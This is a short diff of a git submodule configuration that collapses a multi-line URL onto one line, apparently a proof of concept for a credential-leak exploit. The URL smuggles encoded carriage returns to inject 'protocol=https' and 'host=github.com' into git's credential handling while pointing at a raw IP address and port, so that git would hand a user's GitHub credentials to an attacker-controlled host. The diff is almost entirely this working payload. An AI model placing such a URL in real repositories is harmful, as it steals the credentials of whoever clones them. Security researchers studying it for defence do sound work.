@@ -1,6 +1,3 @@
 [submodule "Leaked-Credentials"]
   path = Leaked-Credentials
-  url = http://%250dprotocol=https%250dhost=github.com%250d@207.244.255.245:7005/\
-    ?credential.helper=manager\
-    &credential.username=attacker\
-    &credential.password=malicious
+  url = http://%250dprotocol=https%250dhost=github.com%250d@207.244.255.245:7005/?credential.helper=manager&credential.username=attacker&credential.password=malicious
